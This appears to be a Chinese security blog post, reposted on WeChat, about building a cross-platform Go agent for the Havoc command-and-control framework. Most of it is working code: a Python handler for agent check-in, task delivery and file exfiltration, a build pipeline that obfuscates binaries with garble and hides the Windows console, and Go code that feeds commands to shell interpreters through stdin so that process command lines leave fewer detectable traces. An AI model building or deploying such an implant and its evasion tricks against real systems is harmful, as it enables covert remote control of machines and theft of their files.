#  Havoc Framework C2 Agent开发记录

原创 倾旋  [ 中国白客联盟 ](javascript:void\(0\);)

**中国白客联盟** ![]()

微信号 China_Baiker

功能介绍 中国白客联盟(BUC)，即时收取论坛(www.chinabaiker.com)最新、最热的帖子。

____

___发表于_

收录于合集 #渗透测试 90个

**授权转载**

 **背景**

💡 Havoc是一个现代的、可塑性的开发后命令和控制框架，适用于渗透测试人员、红队和蓝队。它是Github上的免费开源软件，由Paul
Ungur（C5pider）编写和维护。开源地址：[HavocFramework/Havoc: The Havoc Framework.
(github.com)](https://github.com/HavocFramework/Havoc)

               

![]()

             

Havoc
Framework分为两部分，TeamServer用于设置监听器、处理Agent请求、处理命令执行、文件下载等功能，Client负责连接TeamServer，通过Websocket与TeamServer管理端口进行认证。

Havoc Framework的仓库中维护了一份默认的C语言版本Demon
Agent，这个Agent的功能比较齐全，但由于是开源的，默认情况下生成的Agent样本会被直接查杀，特征较为明显，而在样本的对抗角度作者也提供了一些可以给使用者发挥的空间：

About Evasion

You might ask if the Demon agent bypasses anti-virus (AV) products or even
endpoint detection and response (EDR) products, most likely not. The Demon
agent wasn't designed to be evasive nor was it within the scope. It was
designed to be as malleable and modular as possible to give the operator as
much power over it to adapt it for the red team operation without overloading
it with evasion techniques and features that are going to be most likely
burned and going to be an IOC by itself. And the devs of the agent don't wanna
play the cat and mouse game with AV & EDR vendors. That said, the Demon agent
is designed to be interoperable with common techniques for bypassing anti-
virus software such as loaders, packers, crypters, and stagers.

大致意思就是Demon不是为了绕过 anti-
virus而开发，只是提供了源代码，这套源代码类似CobaltStrike的Beacon，这些绕过的活还是得使用者各凭本事。Havoc
Framework的架构和CobaltStrike比较相似，只不过TeamServer还负责了Agent的生成、编译动作。

 **Custom Agent(自定义)**

在Havoc Framework的Github主页上，提供了4个Agent的样例：

![]()

观察了一下源代码以后，发现这些Agent全部都不兼容Linux、MacOS，本文介绍一下如何开发跨平台、带一定样本对抗能力的Agent。

要学习Havoc Agent的开发，可以先参考：https://codex-7.gitbook.io/codexs-terminal-window/red-
team/red-team-dev/extending-havoc-c2/third-party-agents
当然，这个作者写的https://github.com/CodeXTF2/PyHmmm是为了教学，所以还是有一些缺陷，不能直接投入使用。

第三方Agent注册以后，发送的数据都是固定的结构，每次数据发送到C2监听端口，会检查4个字节的（Magic Value）魔数：

![]()

![]()

（CALLBACK
DATA）回调数据会被TeamServer发送到Python处理脚本上，然后Python处理脚本使用Websocket与TeamServer通信。

 **实现过程**

这里主要简单介绍一下实现要点，首先编写Agent类，用于给Havoc注册Agent以及Agent请求的处理逻辑：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    class Golang(AgentType):                  Name = "Havoc-Agent"                  Author = "@Rvn0xsy"                  Version = "0.1"                  Description = f"""golang 3rd party agent for Havoc"""                  MagicValue = 0x41414141 # 这个可以修改                  SourceCodeDir = "agent"                  ConfigFile = "agent/options.go"                  AgentName = "Havoc-Agent-Handler"                
      
                      Arch = [                      "386",                      "amd64_v1",                      "arm64"                  ]                
      
                      Formats = [                      {                          "Name": "windows",                          "Extension": "exe",                      },                      {                          "Name": "linux",                          "Extension": "",                      },                      {                          "Name": "darwin",                          "Extension": "",                      },                  ]                
      
                      BuildingConfig = {                      "Sleep": "10"                  }                
      
                      Commands = [                      CommandShell(),                      CommandExit(),                      CommandDownload(),                      CommandShellScript(),                  ]                                    # 用于文件下载                  def write_tmp_file(self, filename, data):                      md5_hash = hashlib.md5()                      # 更新哈希对象的内容                      md5_hash.update(filename.encode('utf-8'))                      # 获取计算得到的 MD5 值                      filename_md5 = md5_hash.hexdigest()                      filepath = "/tmp/" + filename_md5                      with open(filepath, "wb") as f:                          f.write(b64decode(data))                      return filepath                
      
                      def generate(self, config: dict) -> None:                                                           # 生成功能最后介绍                      logging.info(f"[*] config: {config}")                
      
                          self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")                      self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")                      self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")                      # ....                
      
                      def response(self, response: dict) -> bytes:                      logging.info("Received request from agent")                      agent_header = response["AgentHeader"]                      # the team server base64 encodes the request.                      agent_response = b64decode(response["Response"])                      agent_json = json.loads(agent_response)                      if agent_json["task"] == "register":                          logging.info("[*] Registered agent")                          self.register(agent_header, json.loads(agent_json["data"]))                          AgentID = response["AgentHeader"]["AgentID"]                          self.console_message(AgentID, "Good", f"Python agent {AgentID} registered", "")                          return b'registered'                      elif agent_json["task"] == "base64":                          AgentID = response["Agent"]["NameID"]                          logging.info("[*] Agent get base64 data")                          if len(agent_json["data"]) > 0:                              print("Output: " + agent_json["data"])                              data = base64.b64decode(agent_json["data"]).decode('utf-8')                              self.console_message(AgentID, "Good", "Received Output:", data)                          return b'get_data'                      elif agent_json["task"] == "get_task":                          AgentID = response["Agent"]["NameID"]                          # self.console_message( AgentID, "Good", "Host checkin", "" )                          logging.info("[*] Agent requested taskings")                          Tasks = self.get_task_queue(response["Agent"])                          logging.info("Tasks retrieved")                          return Tasks                      elif agent_json['task'] == "post_task":                          AgentID = response["Agent"]["NameID"]                          if len(agent_json["data"]) > 0:                              logging.info("Output: " + agent_json["data"])                              self.console_message(AgentID, "Good", "Received Output:", agent_json["data"])                      elif agent_json['task'] == "download_file":                          AgentID = response["Agent"]["NameID"]                          if len(agent_json["data"]) > 0:                              filename = agent_json["external"]                              filepath = self.write_tmp_file(filename, agent_json["data"])                              logging.info("File downloaded")                              self.console_message(AgentID, "Good", "Download: ", filename+" ==> "+filepath)                      return b'ok'

 **注册功能**

  *   *   *   *   *   * 

    
    
      Commands = [                        CommandShell(),       # 执行命令                        CommandExit(),        # 退出，好像未实现                        CommandDownload(),    # 文件下载                        CommandShellScript(), # 执行脚本                    ]

 **处理逻辑**

agent_json会接受到不通的数据，通过其中的字段区分是那种类型的请求：

•register Agent上线

•base64 接收到Base64的数据，解码输出到控制台上

•get_task 从TeamServer获取任务，发送给Agent

•post_task 将接收到的内容发送给Client控制台

•download_file 接收文件保存tmp目录，其实就是文件下载

Agent生成逻辑

💡 GoReleaser 是一个用于简化 Go 项目发布过程的开源工具。它可以自动化构建、打包和发布 Go
项目，并支持将项目发布到各种不同的发布渠道，如二进制文件、Docker 镜像、Homebrew、Snapcraft 等。

🛠️ Garble
是一个通过包装Go工具链来混淆Go代码的一个工具，它基本上兼容了Go的编译命令，在此基础上增加了一些混淆模式的选项，通过设置选项可以构建不同混淆程度的Go二进制程序。

                 

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    GoReleaser - Buildshttps://github.com/burrowers/garble# This is an example .goreleaser.yml file with some sane defaults.                # Make sure to check the documentation at https://goreleaser.com                project_name: Havoc-Agent-Handler                before:                  hooks:                    # You may remove this if you don't use go modules.                    - go mod tidy                    # you may remove this if you don't need go generate                    - go generate ./...                builds:                  - env:                      - CGO_ENABLED=0                      - LANG=en_US                    goos:                      - linux                      - windows                      - darwin                    goarch:                      - amd64                      - arm64                      - "386"                    command: -tiny                    flags:                      - -literals                      - -seed=random                      - build                      - -trimpath                #      - >-                #        -ldflags={{- if eq .Os "windows" }}"-s -w -H windowsgui"{{else}}"-s -w"{{- end }}                    ldflags:                      - >-                        {{- if eq .Os "windows" }}-s -w -H windowsgui{{else}}-s -w{{- end }}                    gobinary: garble                checksum:                  name_template: 'checksums.txt'                snapshot:                  name_template: "{{ incpatch .Version }}-next"                changelog:                  sort: asc                  filters:                    exclude:                      - '^docs:'                      - '^test:'

这部分我采用了goreleaser+garble ，能过做一些静态层面的混淆：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    def generate(self, config: dict) -> None:                  
      
                            logging.info(f"[*] config: {config}")                  
      
                            self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")                        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")                        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")                        # 复制目录                        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))                        dest_dir = os.path.join("/tmp", random_dir)                        shutil.copytree(self.SourceCodeDir, dest_dir)                        logging.info(f"[*] Successfully copied '{self.SourceCodeDir}' to '{dest_dir}'")                        with open(dest_dir + '/options.go', "r") as replacer:                            content = replacer.read()                        modified_content = content.replace('OPTIONS_STRING', json.dumps(config['Options']))                        with open(dest_dir + '/options.go', 'w') as file:                            file.write(modified_content)                        arch = config['Options']['Arch']                        os_type = config['Options']['Format']                        goreleaser_build_command = ["goreleaser", "build", "--snapshot", "--rm-dist", "--single-target"]                        env_variables = os.environ                        env_variables['GOOS'] = os_type                        env_variables['GOARCH'] = arch.replace('_v1', '')                        process = subprocess.Popen(goreleaser_build_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=dest_dir, env=env_variables)                        stdout, stderr = process.communicate()                        self.builder_send_message(config['ClientID'], "Info", "Standard Output:")                        self.builder_send_message(config['ClientID'], "Info", stdout.decode())                        self.builder_send_message(config['ClientID'], "Info", "Standard Error:")                        self.builder_send_message(config['ClientID'], "Info", stderr.decode())                  
      
                            extension = ".exe" if os_type == "windows" else ""                        # Havoc-Agent-Handler_darwin_amd64                        # agent/dist/Havoc-Agent-Handler_windows_amd64.exe                        # agent/dist/Havoc-Agent-Handler_windows_amd64/Havoc-Agent-Handler_windows_amd64.exe                        folder = f"dist/{self.AgentName}_{os_type}_{arch}"                        filename = f"{dest_dir}/{folder}/{self.AgentName}{extension}"                        logging.info(f"[*] filename: {filename}")                        with open(filename, "rb") as f:                            data = f.read()                        self.builder_send_payload(config['ClientID'], self.AgentName + extension,                                                  data)                        shutil.rmtree(dest_dir)

 **命令执行的优化**

为了支持执行跨平台的命令，减少命令行的特征，我会考虑将CMD、Powershell、Bash这样的解释器进程创建起来，然后向STDIN写入命令来读取STDOUT获取结果。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func (agent *LinuxAgent) ExecuteScript(shell string, command string, timeout time.Duration) string {                         var cmd *exec.Cmd                
      
                             cmd = exec.Command(shell, "-")                
      
                             // 获取标准输入（stdin）管道                         stdin, err := cmd.StdinPipe()                         if err != nil {                                    return err.Error()                         }                
      
                             // 获取标准输出（stdout）管道                         stdout, err := cmd.StdoutPipe()                         if err != nil {                                    return err.Error()                         }                
      
                             // 启动进程                         err = cmd.Start()                         if err != nil {                                    return err.Error()                         }                
      
                             // 创建一个用于读取标准输出的读取器                         reader := bufio.NewReader(stdout)                
      
                             // 创建一个上下文，并设置超时时间                         ctx, cancel := context.WithTimeout(context.Background(), timeout)                         defer cancel()                
      
                             // 创建一个缓冲区，用于保存命令输出结果                         var outputBuf bytes.Buffer                
      
                             // 用于发送命令到标准输入的 goroutine                         go func() {                                    // 将命令字符串按行拆分，并逐行发送到标准输入                                    scanner := bufio.NewScanner(strings.NewReader(command))                                    for scanner.Scan() {                                               command := scanner.Text()                                               // 发送命令到标准输入                                               _, err := fmt.Fprintln(stdin, command+"\n")                                               if err != nil {                                                          log.Println(err)                                               }                                    }                                    // 关闭标准输入管道，表示输入结束                                    stdin.Close()                         }()                
      
                             // 用于读取命令输出结果并保存到缓冲区的 goroutine                         go func() {                                    // 读取命令输出结果并保存到缓冲区                                    for {                                               select {                                               case <-ctx.Done():                                                          return                                               default:                                                          line, err := reader.ReadString('\n')                                                          if err != nil && err != io.EOF {                                                                     return                                                          }                
      
                                                              outputBuf.WriteString(line)                
      
                                                              if err == io.EOF {                                                                     return                                                          }                                               }                                    }                         }()                
      
                             // 等待进程退出                         err = cmd.Wait()                         if err != nil {                                    return err.Error()                         }                         // 将缓冲区的内容转换为字符串                         output := outputBuf.String()                         return output              }

通过这个功能，可以在C2中执行：

  *   *   * 

    
    
    C2 > shell_script powershell.exe /local/path/to/file.ps1              C2 > shell_script /bin/bash /local/path/to/file.sh              C2 > shell_script cmd.exe /local/path/to/file.bat

如此一来，进程命令行就不会产生cmd.exe /c XXX 这样有特征的内容。

![]()

![]()

  

全部源代码：https://github.com/Rvn0xsy/Havoc-Agent-Handler

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

